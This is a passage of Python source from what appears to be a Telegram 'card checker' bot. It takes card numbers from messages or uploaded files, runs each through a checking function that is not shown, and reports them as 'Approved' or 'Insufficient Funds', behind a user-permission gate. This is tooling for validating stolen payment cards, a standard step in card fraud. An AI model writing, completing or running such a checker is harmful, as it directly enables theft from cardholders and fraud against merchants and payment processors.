            if approved_results:
                bot.send_message(message.chat.id, "💳 Approved Cards Summary:")
                for result in approved_results:
                    bot.send_message(message.chat.id, result)
                    
            if insufficient_results:
                bot.send_message(message.chat.id, "🟡 Insufficient Funds Cards Summary:")
                for result in insufficient_results:
                    bot.send_message(message.chat.id, result)
                
    except Exception as e:
        if message.message_id in active_checks:
            del active_checks[message.message_id]
        bot.reply_to(message, f"Error processing file: {str(e)}")

# Keep the existing message handler for single card checks
@bot.message_handler(func=lambda message: bool(re.search(card_pattern, message.text)))
def check_card(message):
    if not check_user_permission(message):
        return
        
    matches = re.finditer(card_pattern, message.text)
    
    for match in matches:
        card = match.group(0)
        processing_msg = bot.reply_to(message, f"⌛ Checking card: {card}...")
        
        try:
            result = chk(card)
            response = f"{result}"
        except Exception as e:
            response = f"Error checking card {card}: {str(e)}"
        
        bot.edit_message_text(
            response,
            chat_id=processing_msg.chat.id,
            message_id=processing_msg.message_id
        )

# Start the bot
if __name__ == '__main__':
    print("Bot started...")
    bot.infinity_polling()


